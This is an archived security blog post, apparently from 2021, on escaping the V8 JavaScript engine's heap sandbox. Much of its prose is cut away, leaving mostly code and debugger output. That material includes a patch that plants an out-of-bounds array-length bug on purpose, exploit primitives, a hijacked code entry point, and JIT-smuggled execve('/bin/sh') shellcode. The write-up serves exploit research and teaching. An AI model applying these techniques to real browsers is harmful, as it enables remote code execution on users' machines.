@@ -1,0 +1,485 @@
+<!doctype html><html lang=en>
+<head>
+<title>Escaping the V8 Heap Sandbox :: Anvbis</title>
+<meta charset=utf-8>
+<meta name=viewport content="width=device-width,initial-scale=1">
+<meta name=description content="Overview The V8 heap sandbox has been around for quite some time now, and while it initially broke several methods used to gain code execution (looking at you, wasm shellcode), new methods have risen to take their place.
+I thought it would be worthwile to detail one such method in an article. I&amp;rsquo;ve seen a very limited amount of posts on this particular topic, and what I have seen has been pretty poorly explained.">
+<meta name=keywords content>
+<meta name=robots content="noodp">
+<link rel=canonical href=https://anvbis.github.io/posts/chrome-v8-escaping-the-v8-heap-sandbox/>
+<link rel=stylesheet href=https://anvbis.github.io/assets/style.css>
+<link rel=stylesheet href=https://anvbis.github.io/assets/green.css>
+<link rel=apple-touch-icon href=https://anvbis.github.io/img/apple-touch-icon-192x192.png>
+<link rel="shortcut icon" href=https://anvbis.github.io/img/favicon/green.png>
+<meta name=twitter:card content="summary">
+<meta property="og:locale" content="en">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Escaping the V8 Heap Sandbox">
+<meta property="og:description" content="Overview The V8 heap sandbox has been around for quite some time now, and while it initially broke several methods used to gain code execution (looking at you, wasm shellcode), new methods have risen to take their place.
+I thought it would be worthwile to detail one such method in an article. I&amp;rsquo;ve seen a very limited amount of posts on this particular topic, and what I have seen has been pretty poorly explained.">
+<meta property="og:url" content="https://anvbis.github.io/posts/chrome-v8-escaping-the-v8-heap-sandbox/">
+<meta property="og:site_name" content="Anvbis">
+<meta property="og:image" content="https://anvbis.github.io/img/favicon/green.png">
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+<meta property="article:section" content="Web Browsers">
+<meta property="article:section" content="Javascript Engines">
+<meta property="article:published_time" content="2021-11-27 00:00:00 +0000 UTC">
+</head>
+<body class=green>
+<div class="container center headings--one-size">
+<header class=header>
+<div class=header__inner>
+<div class=header__logo>
+<a href=/>
+<div class=logo>
+Anvbis
+</div>
+</a>
+</div>
+<div class=menu-trigger>menu</div>
+</div>
+<nav class=menu>
+<ul class="menu__inner menu__inner--desktop">
+<li><a href=/about>About</a></li>
+<li><a href=/categories>Categories</a></li>
+<li><a href=/posts>Posts</a></li>
+</ul>
+<ul class="menu__inner menu__inner--mobile">
+<li><a href=/about>About</a></li>
+<li><a href=/categories>Categories</a></li>
+<li><a href=/posts>Posts</a></li>
+</ul>
+</nav>
+</header>
+<div class=content>
+<div class=post>
+<h1 class=post-title>
+<a href=https://anvbis.github.io/posts/chrome-v8-escaping-the-v8-heap-sandbox/>Escaping the V8 Heap Sandbox</a></h1>
+<div class=post-meta>
+<span class=post-date>
+2021-11-27
+</span>
+</div>
+<span class=post-tags>
+#<a href=https://anvbis.github.io/tags/browser/>browser</a>&nbsp;
+#<a href=https://anvbis.github.io/tags/v8/>v8</a>&nbsp;
+#<a href=https://anvbis.github.io/tags/chromium/>chromium</a>&nbsp;
+</span>
+<div class=post-content><div>
+<h2 id=overview>Overview<a href=#overview class=hanchor arialabel=Anchor>&#8983;</a> </h2>
+<p>The V8 heap sandbox has been around for quite some time now, and while it initially broke several methods used to gain code execution (looking at you, wasm shellcode), new methods have risen to take their place.</p>
+<p>I thought it would be worthwile to detail one such method in an article. I&rsquo;ve seen a very limited amount of posts on this particular topic, and what I have seen has been pretty poorly explained. This is mostly for my own reference, but anyone is welcome to learn from it.</p>
+<h2 id=introducing-the-heap-sandbox>Introducing the Heap Sandbox<a href=#introducing-the-heap-sandbox class=hanchor arialabel=Anchor>&#8983;</a> </h2>
+<p>First introduced into V8 around a year ago (at the time of this post), the motivation behind the implementation of the heap sandbox was to limit an attacker&rsquo;s ability to write data outside of V8&rsquo;s heap address-space.</p>
+<p>It primarily performs this through the isolation of all external pointers and references to off-heap objects (e.g. the backing store of an ArrayBuffer object). In the heap sandbox, these pointers are converted to references to an external pointer table, essentially indices of a lookup table.</p>
+<p>Memory corruption outside of V8&rsquo;s heap is considered to be an escape from this sandbox. That definition also covers arbitrary code execution.</p>
+<h3 id=exploring-the-sandbox>Exploring the Sandbox<a href=#exploring-the-sandbox class=hanchor arialabel=Anchor>&#8983;</a> </h3>
+<p>So as previously mentioned, external pointers should be isolated and converted to references to elements of an external pointer table, we can explore what this looks like in practice.</p>
+<p>We can start by allocating two objects, <code>a</code> and <code>b</code>, printing debug information, and digging around the memory a little.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#66d9ef>let</span> <span style=color:#a6e22e>a</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>ArrayBuffer</span>(<span style=color:#ae81ff>1337</span>);
+<span style=color:#f92672>%</span><span style=color:#a6e22e>DebugPrint</span>(<span style=color:#a6e22e>a</span>);
+
+<span style=color:#66d9ef>let</span> <span style=color:#a6e22e>b</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>ArrayBuffer</span>(<span style=color:#ae81ff>1337</span>);
+<span style=color:#f92672>%</span><span style=color:#a6e22e>DebugPrint</span>(<span style=color:#a6e22e>b</span>);
+
+<span style=color:#f92672>%</span><span style=color:#a6e22e>SystemBreak</span>();
+</code></pre></div><p>The debug information for these two objects shows that their backing stores are located at <code>0x19fa00000000</code> and <code>0x19fa00001000</code> respectively. Interesting that ArrayBuffer objects are effectively allocated an entire page, even if their size is significantly smaller than 4096 bytes.</p>
+<pre><code>DebugPrint: 0x19f90010ba95: [JSArrayBuffer]
+ - map: 0x19f90024b945 &lt;Map[68](HOLEY_ELEMENTS)&gt; [FastProperties]
+ - prototype: 0x19f90024ba19 &lt;Object map = 0x19f90024b96d&gt;
+ - elements: 0x19f900002259 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]
+ - embedder fields: 2
+ - backing_store: 0x19fa00000000
+ - byte_length: 1337
+ - max_byte_length: 1337
+...
+
+DebugPrint: 0x19f90010bad9: [JSArrayBuffer]
+ - map: 0x19f90024b945 &lt;Map[68](HOLEY_ELEMENTS)&gt; [FastProperties]
+ - prototype: 0x19f90024ba19 &lt;Object map = 0x19f90024b96d&gt;
+ - elements: 0x19f900002259 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]
+ - embedder fields: 2
+ - backing_store: 0x19fa00001000
+ - byte_length: 1337
+ - max_byte_length: 1337
+...
+</code></pre><p>Viewing these objects in memory, they&rsquo;re almost identical except for one value stored 0x24 bytes from the start of the object, <code>0x01000000</code> and <code>0x01000010</code>. It wouldn&rsquo;t be too crazy to think these must be the lookup values for the backing store.</p>
+<pre><code>pwndbg&gt; x/12dwx 0x19f90010ba95-1
+0x19f90010ba94:	0x0024b945	0x00002259	0x00002259	0x000023e1
+0x19f90010baa4:	0x20000000	0x000000a7	0x20000000	0x000000a7
+0x19f90010bab4:	0x00000000	0x01000000	0xe98c1ea0	0x000055fe
+pwndbg&gt; x/12dwx 0x19f90010bad9-1
+0x19f90010bad8:	0x0024b945	0x00002259	0x00002259	0x000023e1
+0x19f90010bae8:	0x20000000	0x000000a7	0x20000000	0x000000a7
+0x19f90010baf8:	0x00000000	0x01000010	0xe98c1f50	0x000055fe
+</code></pre><p>This can easily be verified by setting the memory at that location for object <code>a</code> to that of <code>b</code>. Printing the debug information for object <code>a</code>, it shows that the backing store has updated to that of object <code>b</code>.</p>
+<p>This proves the initial hypothesis was correct. We&rsquo;ve found the reference value used to perform a lookup on the external pointer table.</p>
+<pre><code>pwndbg&gt; set *(int32_t *)(0x19f90010ba94+0x24) = 0x01000010
+pwndbg&gt; job 0x19f90010ba95
+DebugPrint: 0x19f90010ba95: [JSArrayBuffer]
+ - map: 0x19f90024b945 &lt;Map[68](HOLEY_ELEMENTS)&gt; [FastProperties]
+ - prototype: 0x19f90024ba19 &lt;Object map = 0x19f90024b96d&gt;
+ - elements: 0x19f900002259 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]
+ - embedder fields: 2
+ - backing_store: 0x19fa00001000
+ - byte_length: 1337
+ - max_byte_length: 1337
+...
+</code></pre><p>I don&rsquo;t want to dive too deep into the internals of the V8 heap sandbox, so I won&rsquo;t go any further for today. But it is good to know that you can replace an object&rsquo;s index with that of another, potentially giving you write access somewhere else external to the heap.</p>
+<h2 id=escaping-the-heap-sandbox>Escaping the Heap Sandbox<a href=#escaping-the-heap-sandbox class=hanchor arialabel=Anchor>&#8983;</a> </h2>
+<p>&mldr;</p>
+<h3 id=an-example-vulnerability>An Example Vulnerability<a href=#an-example-vulnerability class=hanchor arialabel=Anchor>&#8983;</a> </h3>
+<p>&mldr;</p>
+<div class=collapsable-code>
+<input id=1 type=checkbox checked>
+<label for=1>
+<span class=collapsable-code__language>diff</span>
+<span class=collapsable-code__title>patch.diff</span>
+<span class=collapsable-code__toggle data-label-expand=Show data-label-collapse=Hide></span>
+</label>
+<pre class=language-diff><code>
+diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc
+index 49fe48d698..2944eb9edb 100644
+--- a/src/builtins/builtins-array.cc
+&#43;&#43;&#43; b/src/builtins/builtins-array.cc
+@@ -395,6 &#43;395,25 @@ BUILTIN(ArrayPush) {
+   return *isolate-&gt;factory()-&gt;NewNumberFromUint((new_length));
+ }
+ 
+&#43;BUILTIN(ArrayLen) {
+&#43;  uint32_t len = args.length();
+&#43;  if(len != 2) return ReadOnlyRoots(isolate).undefined_value();
+&#43;
+&#43;  Handle&lt;JSReceiver&gt; receiver;
+&#43;  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
+&#43;      isolate, receiver, Object::ToObject(isolate, args.receiver()));
+&#43;  Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);
+&#43;
+&#43;  Handle&lt;Object&gt; argLen;
+&#43;  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
+&#43;      isolate, argLen, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));
+&#43;  uint32_t newLen = static_cast&lt;uint32_t&gt;(argLen-&gt;Number());
+&#43;
+&#43;  auto raw = *array;
+&#43;  raw.set_length(Smi::FromInt(newLen));
+&#43;  return ReadOnlyRoots(isolate).undefined_value();
+&#43;}
+&#43;
+ namespace {
+ 
+ V8_WARN_UNUSED_RESULT Object GenericArrayPop(Isolate* isolate,
+diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h
+index 859b5cee9a..a16a7d5ca1 100644
+--- a/src/builtins/builtins-definitions.h
+&#43;&#43;&#43; b/src/builtins/builtins-definitions.h
+@@ -392,6 &#43;392,7 @@ namespace internal {
+   CPP(ArrayPrototypeGroupToMap)                                                \
+   /* ES6 #sec-array.prototype.push */                                          \
+   CPP(ArrayPush)                                                               \
+&#43;  CPP(ArrayLen)                                                                \
+   TFJ(ArrayPrototypePush, kDontAdaptArgumentsSentinel)                         \
+   /* ES6 #sec-array.prototype.shift */                                         \
+   CPP(ArrayShift)                                                              \
+diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc
+index 5888a5cdab..5d13eac799 100644
+--- a/src/compiler/typer.cc
+&#43;&#43;&#43; b/src/compiler/typer.cc
+@@ -1880,6 &#43;1880,8 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) {
+       return Type::Receiver();
+     case Builtin::kArrayPush:
+       return t-&gt;cache_-&gt;kPositiveSafeInteger;
+&#43;    case Builtin::kArrayLen:
+&#43;      return Type::Receiver();
+     case Builtin::kArrayPrototypeReverse:
+     case Builtin::kArrayPrototypeSlice:
+       return Type::Receiver();
+diff --git a/src/init/bootstrapper.cc b/src/init/bootstrapper.cc
+index 7c7b917502..550b25d4ba 100644
+--- a/src/init/bootstrapper.cc
+&#43;&#43;&#43; b/src/init/bootstrapper.cc
+@@ -1808,6 &#43;1808,8 @@ void Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object,
+                           0, false);
+     SimpleInstallFunction(isolate_, proto, &#34;push&#34;, Builtin::kArrayPrototypePush,
+                           1, false);
+&#43;    SimpleInstallFunction(isolate_, proto, &#34;len&#34;, Builtin::kArrayLen,
+&#43;                          2, false);
+     SimpleInstallFunction(isolate_, proto, &#34;reverse&#34;,
+                           Builtin::kArrayPrototypeReverse, 0, false);
+     SimpleInstallFunction(isolate_, proto, &#34;shift&#34;,
+</code></pre>
+</div>
+<p>&mldr;</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#66d9ef>let</span> <span style=color:#a6e22e>a</span> <span style=color:#f92672>=</span> [<span style=color:#ae81ff>1.1</span>, <span style=color:#ae81ff>2.2</span>];
+<span style=color:#a6e22e>a</span>.<span style=color:#a6e22e>len</span>(<span style=color:#ae81ff>1337</span>);
+<span style=color:#f92672>%</span><span style=color:#a6e22e>DebugPrint</span>(<span style=color:#a6e22e>a</span>);
+</code></pre></div><p>&mldr;</p>
+<pre><code>DebugPrint: 0x27ff0004b9c9: [JSArray]
+ - map: 0x27ff0018e6bd &lt;Map[16](PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]
+ - prototype: 0x27ff0018e11d &lt;JSArray[0]&gt;
+ - elements: 0x27ff0004b9b1 &lt;FixedDoubleArray[2]&gt; [PACKED_DOUBLE_ELEMENTS]
+ - length: 1337
+ - properties: 0x27ff00002259 &lt;FixedArray[0]&gt;
+ - All own properties (excluding elements): {
+    0x27ff00006551: [String] in ReadOnlySpace: #length: 0x27ff00144269 &lt;AccessorInfo name= 0x27ff00006551 &lt;String[6]: #length&gt;, data= 0x27ff000023e1 &lt;undefined&gt;&gt; (const accessor descriptor), location: descriptor
+ }
+ - elements: 0x27ff0004b9b1 &lt;FixedDoubleArray[2]&gt; {
+           0: 1.1
+           1: 2.2
+ }
+...
+</code></pre><h3 id=building-exploit-primitives>Building Exploit Primitives<a href=#building-exploit-primitives class=hanchor arialabel=Anchor>&#8983;</a> </h3>
+<p>&mldr;</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#66d9ef>let</span> <span style=color:#a6e22e>oob</span> <span style=color:#f92672>=</span> [<span style=color:#ae81ff>1.1</span>];
+<span style=color:#a6e22e>oob</span>.<span style=color:#a6e22e>len</span>(<span style=color:#ae81ff>1337</span>);
+
+<span style=color:#75715e>/* flt.elements @ oob[] */</span>
+<span style=color:#66d9ef>let</span> <span style=color:#a6e22e>flt</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>x</span>[<span style=color:#ae81ff>1.1</span>];
+
+<span style=color:#75715e>/* obj.elements @ oob[] */</span>
+<span style=color:#66d9ef>let</span> <span style=color:#a6e22e>tmp</span> <span style=color:#f92672>=</span> {<span style=color:#a6e22e>a</span><span style=color:#f92672>:</span> <span style=color:#ae81ff>1</span>};
+<span style=color:#66d9ef>let</span> <span style=color:#a6e22e>obj</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>x</span>[<span style=color:#a6e22e>tmp</span>];
+</code></pre></div><p>&mldr;</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#66d9ef>var</span> <span style=color:#a6e22e>bs</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>ArrayBuffer</span>(<span style=color:#ae81ff>8</span>);
+<span style=color:#66d9ef>var</span> <span style=color:#a6e22e>fs</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Float64Array</span>(<span style=color:#a6e22e>bs</span>);
+<span style=color:#66d9ef>var</span> <span style=color:#a6e22e>is</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>BigUint64Array</span>(<span style=color:#a6e22e>bs</span>);
+
+<span style=color:#66d9ef>function</span> <span style=color:#a6e22e>ftoi</span>(<span style=color:#a6e22e>x</span>) {
+  <span style=color:#a6e22e>fs</span>[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>x</span>;
+  <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>is</span>[<span style=color:#ae81ff>0</span>];
+}
+
+<span style=color:#66d9ef>function</span> <span style=color:#a6e22e>itof</span>(<span style=color:#a6e22e>x</span>) {
+  <span style=color:#a6e22e>is</span>[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>x</span>;
+  <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>fs</span>[<span style=color:#ae81ff>0</span>];
+}
+</code></pre></div><p>&mldr;</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>addrof</span>(<span style=color:#a6e22e>o</span>) {
+}
+
+<span style=color:#66d9ef>function</span> <span style=color:#a6e22e>read</span>(<span style=color:#a6e22e>p</span>) {
+  <span style=color:#75715e>// ...
+</span><span style=color:#75715e></span>  <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>ftoi</span>(<span style=color:#a6e22e>flt</span>[<span style=color:#ae81ff>0</span>]);
+}
+
+<span style=color:#66d9ef>function</span> <span style=color:#a6e22e>write</span>(<span style=color:#a6e22e>p</span>, <span style=color:#a6e22e>x</span>) {
+  <span style=color:#75715e>// ...
+</span><span style=color:#75715e></span>  <span style=color:#a6e22e>flt</span>[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>itof</span>(<span style=color:#a6e22e>x</span>);
+}
+</code></pre></div><h3 id=redirecting-code-execution>Redirecting Code Execution<a href=#redirecting-code-execution class=hanchor arialabel=Anchor>&#8983;</a> </h3>
+<p>&mldr;</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>foo</span> <span style=color:#f92672>=</span> () =&gt; {
+  <span style=color:#66d9ef>return</span>;
+}
+
+<span style=color:#f92672>%</span><span style=color:#a6e22e>DebugPrint</span>(<span style=color:#a6e22e>foo</span>);
+<span style=color:#f92672>%</span><span style=color:#a6e22e>SystemBreak</span>();
+
+<span style=color:#a6e22e>foo</span>();
+</code></pre></div><p>&mldr;</p>
+<pre><code>DebugPrint: 0x31df0004b9cd: [Function]
+ - map: 0x31df00184241 &lt;Map[28](HOLEY_ELEMENTS)&gt; [FastProperties]
+ - prototype: 0x31df001840f5 &lt;JSFunction (sfi = 0x31df00145df5)&gt;
+ - elements: 0x31df00002259 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]
+ - function prototype: &lt;no-prototype-slot&gt;
+ - shared_info: 0x31df00199f41 &lt;SharedFunctionInfo foo&gt;
+ - name: 0x31df00199ea5 &lt;String[3]: #foo&gt;
+ - builtin: CompileLazy
+ - formal_parameter_count: 0
+ - kind: ArrowFunction
+ - context: 0x31df0019a015 &lt;ScriptContext[3]&gt;
+ - code: 0x31df001467e5 &lt;CodeDataContainer BUILTIN CompileLazy&gt;
+ - source code: () =&gt; {
+  return;
+}
+...
+</code></pre><p>&mldr;</p>
+<pre><code>pwndbg&gt; job 0x31df001467e5
+0x31df001467e5: [CodeDataContainer] in OldSpace
+ - map: 0x31df00002a71 &lt;Map[28](CODE_DATA_CONTAINER_TYPE)&gt;
+ - kind: BUILTIN
+ - builtin: CompileLazy
+ - is_off_heap_trampoline: 1
+ - code: 0
+ - code_entry_point: 0x55f3898c21c0
+ - kind_specific_flags: 0
+pwndbg&gt; x/4gx 0x31df001467e5-1
+0x31df001467e4:	0x000023e100002a71	0x898c21c000000000
+0x31df001467f4:	0x00590032000055f3	0x00002a7100000000
+pwndbg&gt; x/gx 0x31df001467e5-1+0xc
+0x31df001467f0:	0x000055f3898c21c0
+</code></pre><p>&mldr;</p>
+<pre><code>pwndbg&gt; set *(int64_t *)(0x31df001467e5-1+0xc) = 0x6161616161616161
+pwndbg&gt; job 0x31df001467e5
+0x31df001467e5: [CodeDataContainer] in OldSpace
+ - map: 0x31df00002a71 &lt;Map[28](CODE_DATA_CONTAINER_TYPE)&gt;
+ - kind: BUILTIN
+ - builtin: CompileLazy
+ - is_off_heap_trampoline: 1
+ - code: 0
+ - code_entry_point: 0x6161616161616161
+ - kind_specific_flags: 0
+pwndbg&gt; c
+...
+ ► 0x55f3898b6c5f &lt;Builtins_CallFunction_ReceiverIsAny+287&gt; jmp rcx &lt;0x6161616161616161&gt;
+</code></pre><h3 id=writing-shellcode>Writing Shellcode<a href=#writing-shellcode class=hanchor arialabel=Anchor>&#8983;</a> </h3>
+<p>&mldr;</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>foo</span> <span style=color:#f92672>=</span> () =&gt; {
+  <span style=color:#66d9ef>return</span> [<span style=color:#ae81ff>1.1</span>, <span style=color:#ae81ff>2.2</span>, <span style=color:#ae81ff>3.3</span>, <span style=color:#ae81ff>4.4</span>];
+}
+
+<span style=color:#f92672>%</span><span style=color:#a6e22e>PrepareFunctionForOptimization</span>(<span style=color:#a6e22e>foo</span>);
+<span style=color:#a6e22e>foo</span>();
+<span style=color:#f92672>%</span><span style=color:#a6e22e>OptimizeFunctionOnNextCall</span>(<span style=color:#a6e22e>foo</span>);
+<span style=color:#a6e22e>foo</span>();
+
+<span style=color:#f92672>%</span><span style=color:#a6e22e>DebugPrint</span>(<span style=color:#a6e22e>foo</span>);
+</code></pre></div><p>&mldr;</p>
+<pre><code>DebugPrint: 0x301d0004ba31: [Function]
+ - map: 0x301d00184241 &lt;Map[28](HOLEY_ELEMENTS)&gt; [FastProperties]
+ - prototype: 0x301d001840f5 &lt;JSFunction (sfi = 0x301d00145df5)&gt;
+ - elements: 0x301d00002259 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]
+ - function prototype: &lt;no-prototype-slot&gt;
+ - shared_info: 0x301d00199f95 &lt;SharedFunctionInfo foo&gt;
+ - name: 0x301d00199ea5 &lt;String[3]: #foo&gt;
+ - formal_parameter_count: 0
+ - kind: ArrowFunction
+ - context: 0x301d0019a07d &lt;ScriptContext[3]&gt;
+ - code: 0x301d0019a1fd &lt;CodeDataContainer TURBOFAN&gt;
+ - source code: () =&gt; {
+  return [1.1, 2.2, 3.3, 4.4];
+}
+...
+</code></pre><p>&mldr;</p>
+<pre><code>pwndbg&gt; job 0x301d0019a1fd
+0x301d0019a1fd: [CodeDataContainer] in OldSpace
+ - map: 0x301d00002a71 &lt;Map[28](CODE_DATA_CONTAINER_TYPE)&gt;
+ - kind: TURBOFAN
+ - is_off_heap_trampoline: 0
+ - code: 0x55cdc0004001 &lt;Code TURBOFAN&gt;
+ - code_entry_point: 0x55cdc0004040
+ - kind_specific_flags: 4
+pwndbg&gt; x/40i 0x55cdc0004040
+...
+   0x55cdc00040a7:	movabs r10,0x3ff199999999999a
+   0x55cdc00040b1:	vmovq  xmm0,r10
+   0x55cdc00040b6:	vmovsd QWORD PTR [rcx+0x7],xmm0
+   0x55cdc00040bb:	movabs r10,0x400199999999999a
+   0x55cdc00040c5:	vmovq  xmm0,r10
+   0x55cdc00040ca:	vmovsd QWORD PTR [rcx+0xf],xmm0
+   0x55cdc00040cf:	movabs r10,0x400a666666666666
+   0x55cdc00040d9:	vmovq  xmm0,r10
+   0x55cdc00040de:	vmovsd QWORD PTR [rcx+0x17],xmm0
+   0x55cdc00040e3:	movabs r10,0x401199999999999a
+...
+</code></pre><p>&mldr;</p>
+<pre><code>pwndbg&gt; x/gx 0x55cdc00040a7+2
+0x55cdc00040a9:	0x3ff199999999999a
+pwndbg&gt; x/gx 0x55cdc00040bb+2
+0x55cdc00040bd:	0x400199999999999a
+pwndbg&gt; p/x (0x55cdc00040bb+2)-(0x55cdc00040a7+2)
+$3 = 0x14
+</code></pre><p>&mldr;</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py></code></pre></div><p>&mldr;</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#75715e>/* execve(&#34;/bin/sh&#34;, 0, 0); */</span>
+<span style=color:#66d9ef>const</span> <span style=color:#a6e22e>foo</span> <span style=color:#f92672>=</span> () =&gt; {
+  <span style=color:#66d9ef>return</span> [
+    <span style=color:#ae81ff>1.0</span>,
+    <span style=color:#ae81ff>1.95538254221075331056310651818</span><span style=color:#a6e22e>E</span><span style=color:#f92672>-</span><span style=color:#ae81ff>246</span>,
+    <span style=color:#ae81ff>1.95606125582421466942709801013</span><span style=color:#a6e22e>E</span><span style=color:#f92672>-</span><span style=color:#ae81ff>246</span>,
+    <span style=color:#ae81ff>1.99957147195425773436923756715</span><span style=color:#a6e22e>E</span><span style=color:#f92672>-</span><span style=color:#ae81ff>246</span>,
+    <span style=color:#ae81ff>1.95337673326740932133292175341</span><span style=color:#a6e22e>E</span><span style=color:#f92672>-</span><span style=color:#ae81ff>246</span>,
+    <span style=color:#ae81ff>2.63486047652296056448306022844</span><span style=color:#a6e22e>E</span><span style=color:#f92672>-</span><span style=color:#ae81ff>284</span>
+  ];
+}
+</code></pre></div><h3 id=executing-shellcode>Executing Shellcode<a href=#executing-shellcode class=hanchor arialabel=Anchor>&#8983;</a> </h3>
+<p>&mldr;</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#75715e>/* execve(&#34;/bin/sh&#34;, 0, 0); */</span>
+<span style=color:#66d9ef>const</span> <span style=color:#a6e22e>foo</span> <span style=color:#f92672>=</span> () =&gt; {
+  <span style=color:#66d9ef>return</span> [
+    <span style=color:#ae81ff>1.0</span>,
+    <span style=color:#ae81ff>1.95538254221075331056310651818</span><span style=color:#a6e22e>E</span><span style=color:#f92672>-</span><span style=color:#ae81ff>246</span>,
+    <span style=color:#ae81ff>1.95606125582421466942709801013</span><span style=color:#a6e22e>E</span><span style=color:#f92672>-</span><span style=color:#ae81ff>246</span>,
+    <span style=color:#ae81ff>1.99957147195425773436923756715</span><span style=color:#a6e22e>E</span><span style=color:#f92672>-</span><span style=color:#ae81ff>246</span>,
+    <span style=color:#ae81ff>1.95337673326740932133292175341</span><span style=color:#a6e22e>E</span><span style=color:#f92672>-</span><span style=color:#ae81ff>246</span>,
+    <span style=color:#ae81ff>2.63486047652296056448306022844</span><span style=color:#a6e22e>E</span><span style=color:#f92672>-</span><span style=color:#ae81ff>284</span>
+  ];
+}
+
+<span style=color:#f92672>%</span><span style=color:#a6e22e>PrepareFunctionForOptimization</span>(<span style=color:#a6e22e>foo</span>);
+<span style=color:#a6e22e>foo</span>();
+<span style=color:#f92672>%</span><span style=color:#a6e22e>OptimizeFunctionOnNextCall</span>(<span style=color:#a6e22e>foo</span>);
+<span style=color:#a6e22e>foo</span>();
+
+<span style=color:#f92672>%</span><span style=color:#a6e22e>DebugPrint</span>(<span style=color:#a6e22e>foo</span>);
+<span style=color:#f92672>%</span><span style=color:#a6e22e>SystemBreak</span>();
+
+<span style=color:#a6e22e>foo</span>();
+</code></pre></div><p>&mldr;</p>
+<pre><code>pwndbg&gt; job 0x25ea0019a215
+0x25ea0019a215: [CodeDataContainer] in OldSpace
+ - map: 0x25ea00002a71 &lt;Map[28](CODE_DATA_CONTAINER_TYPE)&gt;
+ - kind: TURBOFAN
+ - is_off_heap_trampoline: 0
+ - code: 0x564b80004001 &lt;Code TURBOFAN&gt;
+ - code_entry_point: 0x564b80004040
+ - kind_specific_flags: 4
+pwndbg&gt; x/40i 0x564b80004040
+...
+   0x564b800040ba:	movabs r10,0xceb580068732f68
+   0x564b800040c4:	vmovq  xmm0,r10
+   0x564b800040c9:	vmovsd QWORD PTR [rcx+0xf],xmm0
+   0x564b800040ce:	movabs r10,0xceb5a6e69622f68
+   0x564b800040d8:	vmovq  xmm0,r10
+   0x564b800040dd:	vmovsd QWORD PTR [rcx+0x17],xmm0
+   0x564b800040e2:	movabs r10,0xcebf63120e0c148
+   0x564b800040ec:	vmovq  xmm0,r10
+   0x564b800040f1:	vmovsd QWORD PTR [rcx+0x1f],xmm0
+   0x564b800040f6:	movabs r10,0xceb50d231d00148
+...
+</code></pre><p>&mldr;</p>
+<pre><code>pwndbg&gt; x/gx 0x564b800040ba+2
+0x564b800040bc:	0x0ceb580068732f68
+pwndbg&gt; p/x (0x564b800040ba+2)-0x564b80004040
+$1 = 0x7c
+pwndbg&gt; set *(int64_t *)(0x25ea0019a215-1+0xc) = 0x564b80004040+0x7c
+pwndbg&gt; job 0x25ea0019a215
+0x25ea0019a215: [CodeDataContainer] in OldSpace
+ - map: 0x25ea00002a71 &lt;Map[28](CODE_DATA_CONTAINER_TYPE)&gt;
+ - kind: TURBOFAN
+ - is_off_heap_trampoline: 0
+ - code: 0x564b80004001 &lt;Code TURBOFAN&gt;
+ - code_entry_point: 0x564b800040bc
+ - kind_specific_flags: 4
+</code></pre><p>&mldr;</p>
+<pre><code>pwndbg&gt; c
+Continuing.
+[Thread 0x7f07a4162700 (LWP 288626) exited]
+[Thread 0x7f07a4963700 (LWP 288625) exited]
